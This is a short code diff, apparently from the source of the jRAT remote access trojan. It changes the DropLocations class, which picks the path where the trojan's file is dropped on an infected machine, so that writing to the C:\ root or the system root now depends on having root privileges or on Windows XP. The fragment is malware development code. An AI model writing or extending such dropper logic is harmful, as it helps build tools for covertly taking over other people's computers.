@@ -1,5 +1,6 @@
 package io.jrat.common;
 
+import io.jrat.common.utils.Utils;
 import java.io.File;
 
 import com.redpois0n.oslib.AbstractOperatingSystem;
@@ -22,7 +23,7 @@ public class DropLocations {
 		
 		AbstractOperatingSystem os = OperatingSystem.getOperatingSystem();
 
-		if (i == 0 || os.getType() == OperatingSystem.WINDOWS && ((WindowsOperatingSystem) os).getVersion() == WindowsVersion.WINXP) {
+		if (i == 0 && Utils.isRoot() || os.getType() == OperatingSystem.WINDOWS && ((WindowsOperatingSystem) os).getVersion() == WindowsVersion.WINXP) {
 			if (os.getType() == OperatingSystem.WINDOWS) {
 				file = new File("C:\\" + fileName);
 			} else {
